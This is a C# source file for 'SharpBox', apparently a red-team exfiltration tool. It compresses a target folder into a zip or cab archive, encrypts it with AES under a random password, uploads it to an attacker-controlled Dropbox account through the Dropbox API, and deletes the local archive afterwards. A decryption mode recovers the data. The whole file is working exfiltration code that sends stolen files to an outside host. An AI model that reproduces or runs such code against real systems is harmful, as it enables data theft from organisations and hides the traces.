
using Ionic.Zip;
using System;
using System.IO;
using System.Text;
using Microsoft.Deployment.Compression.Cab;
using Microsoft.Deployment.Compression;
using System.Security.Cryptography;
using System.Net;
using System.Threading;
using System.Security.Cryptography.X509Certificates;
using System.Net.Security;
using CommandLine;
using CommandLine.Text;

namespace SharpBox
{
    public class Program
    {
        public static void Main(string[] args)
        {
            Options ops = new Options();
            CommandLine.Parser.Default.ParseArguments(args, ops);
            ServicePointManager.ServerCertificateValidationCallback += ValidateRemoteCertificate;
            ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls;
            //ops.dbxToken = "";  //Hardcode your dropbox token here if you do not wish to pass as an argument


            if (ops.path == null)
            {
                return;
            }

            if (ops.decrypt == true)
            {
                DecryptFile(ops);
                return;
            }

            if (ops.compression == Options.Methods.Cab)
            {
                ops.OutFile = "data.cab";
                CabInfo cab = new CabInfo(Path.Combine(ops.path, ops.OutFile));
                try
                {
                    Thread cabThread = new Thread(() =>
                    {
                        cab.Pack(ops.path, true, Microsoft.Deployment.Compression.CompressionLevel.Max, null);
                    });
                    cabThread.Start();
                    cabThread.Join();

                    Console.WriteLine("[*] Attempting to encrypt cab file.");
                    EncryptFile(ops);
                }
                catch (Exception e)
                {
                    Console.WriteLine(e.ToString());
                }
            }
            else
            {
                if (ops.compression == Options.Methods.Zip)
                {
                    ZipFile zip = new ZipFile();
                    try
                    {
                        ops.OutFile = "data.zip";
                        Thread zipThread = new Thread(() =>
                        {
                            string[] files = Directory.GetFiles(ops.path);
                            foreach (string fileName in files)
                            {
                                zip.AddFile(fileName, "archive");
                                zip.Save(Path.Combine(ops.path, ops.OutFile));
                            }
                        });
                        zipThread.Start();
                        zipThread.Join();

                        Console.WriteLine("[*] Attempting to encrypt zip file.");
                        EncryptFile(ops);
                    }
                    catch (Exception e)
                    {
                        Console.WriteLine(e.ToString());
                    }

                }
                else
                {
                    return;
                }
            }
        }
        private static string GeneratePass()
        {
            const string space = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890";
            var builder = new StringBuilder();
            var random = new Random();
            for (var i = 0; i < 12; i++)
            {
                builder.Append(space[random.Next(space.Length)]);
            }
            return builder.ToString();
        }

        private static void EncryptFile(Options ops)
        {
            try
            {
                string password = GeneratePass();
                Console.WriteLine($"[*] Generated Password: {password} \n[*]Use this Password for decryption process!");
                string initVector = $"HR$2pI{password.Substring(0, 5)}pIj12";
                byte[] key = Encoding.ASCII.GetBytes(password);
                byte[] IV = Encoding.ASCII.GetBytes(initVector);
                //string cryptFile = ops.path + "\\data";
                string cryptFile = Path.Combine(ops.path, "data");
                FileStream fsCrypt = new FileStream(cryptFile, FileMode.Create);
                RijndaelManaged RMCrypto = new RijndaelManaged();
                CryptoStream cs = new CryptoStream(fsCrypt, RMCrypto.CreateEncryptor(key, IV), CryptoStreamMode.Write);
                FileStream fsIn = new FileStream((Path.Combine(ops.path, ops.OutFile)), FileMode.Open);
                int data;
                while ((data = fsIn.ReadByte()) != -1)
                    cs.WriteByte((byte)data);

                cs.FlushFinalBlock();
                fsIn.Flush();
                fsIn.Close();
                cs.Close();
                fsCrypt.Close();
                File.Delete(Path.Combine(ops.path, ops.OutFile));
            }
            catch (Exception e)
            {
                Console.WriteLine("Encryption failed!", "Error " + e);
            }
            FileUploadToDropbox(ops);
        }

        private static void DecryptFile(Options ops)
        {
            Console.WriteLine("[*] Attempting to decrypt file!");
            string initVector = $"HR$2pI{ops.password.Substring(0, 5)}pIj12";
            byte[] IV = Encoding.ASCII.GetBytes(initVector);
            byte[] key = Encoding.ASCII.GetBytes(ops.password);
            FileStream fsCrypt = new FileStream(ops.path, FileMode.Open);
            RijndaelManaged RMCrypto = new RijndaelManaged();
            CryptoStream cs = new CryptoStream(fsCrypt, RMCrypto.CreateDecryptor(key, IV), CryptoStreamMode.Read);
            FileStream fsOut = new FileStream(ops.OutFile, FileMode.Create);

            int data;
            while ((data = cs.ReadByte()) != -1)
                fsOut.WriteByte((byte)data);

            fsOut.Flush();
            fsOut.Close();
            cs.Close();
            fsCrypt.Close();
            Console.WriteLine("[*] Decrypted data successfully!");
        }

        public static void FileUploadToDropbox(Options ops)
        {
            try
            {
                string uri = @"https://content.dropboxapi.com/2/files/upload";
                Uri uri1 = new Uri(uri);
                WebClient myWebClient = new WebClient();
                myWebClient.Headers[HttpRequestHeader.ContentType] = "application/octet-stream";
                myWebClient.Headers[HttpRequestHeader.Authorization] = "Bearer " + ops.dbxToken;
                myWebClient.Headers.Add($"Dropbox-API-Arg: {{\"path\":\"{ops.dbxPath}/data\",\"mode\": \"add\",\"autorename\": true,\"mute\": false,\"strict_conflict\": false}}");
                var file = Path.Combine(ops.path, "data");
                byte[] buffer;
                using (var fileStream = new FileStream(file, FileMode.Open, FileAccess.Read))
                {
                    int length = (int)fileStream.Length;
                    buffer = new byte[length];
                    fileStream.Read(buffer, 0, length);
                }
                byte[] request = myWebClient.UploadData(uri1, "POST", buffer);
                var Result = System.Text.Encoding.Default.GetString(request);
                Console.WriteLine(Result);
                //delete compressed/encrypted file after uploading
                File.Delete(file);
                return;
            }
            catch (Exception e)
            {
                Console.WriteLine(e.ToString());
            }
        }

        private static bool ValidateRemoteCertificate(object sender, X509Certificate cert, X509Chain chain, SslPolicyErrors error)
        {
            if (error == System.Net.Security.SslPolicyErrors.None)
            {
                return true;
            }
            Console.WriteLine("X509Certificate [{0}] Policy Error: '{1}'",
                cert.Subject,
                error.ToString());
            return false;
        }
    }

    public class Options
    {
        public enum Methods
        {
            Zip,
            Cab
        }

        [Option('f', "path", Required = true, HelpText = "path to the folder you wish to compress the contents of")]
        public string path { get; set; }

        [Option('o', "OutFile", Required = false, HelpText = "Name of the compressed file")]
        public string OutFile { get; set; }

        [Option('t', "dbxToken", Required = false, HelpText = "Dropbox Access Token")]
        public string dbxToken { get; set; }

        [Option('x', "dbxPath", Required = false, DefaultValue = "/test/data", HelpText = "path to dbx folder")]
        public string dbxPath { get; set; }

        [Option('c', "compression", Required = false, DefaultValue = Options.Methods.Zip, HelpText = "this option lets you choose to zip or cab the folder")]
        public Methods compression { get; set; }

        [Option('d', "decrypt", Required = false, DefaultValue = false, HelpText = "Choose this to decrypt a zip or cabbed file previously encrypted by this tool.  Requires original password argument.")]
        public bool decrypt { get; set; }

        [Option('p', "decryption-password", Required = false, HelpText = "Password to decrypt a zipped or cabbed file.")]
        public string password { get; set; }

        [HelpOption]
        public string GetUsage()
        {
            {
                var text = @"SharpBox 1.0.0
Copyright c  2018 Pickles
Usage: SharpBox <options>

      -f, --path                   Required. path to the folder you wish to
                                   compress the contents of

      -o, --OutFile                Name of the compressed file

      -t, --dbxToken               Dropbox Access Token

      -x, --dbxPath                (Default: /test/data) path to dbx folder

      -c, --compression            (Default: Zip) this option lets you choose to
                                   zip or cab the folder

      -d, --decrypt                (Default: False) Choose this to decrypt a zip or
                                   cabbed file previously encrypted by this tool.
                                   Requires original password argument.

      -p, --decryption-password    Password to decrypt a zipped or cabbed file.

      --help                       Display this help screen."
;


                return text;
            }
        }
    }
}
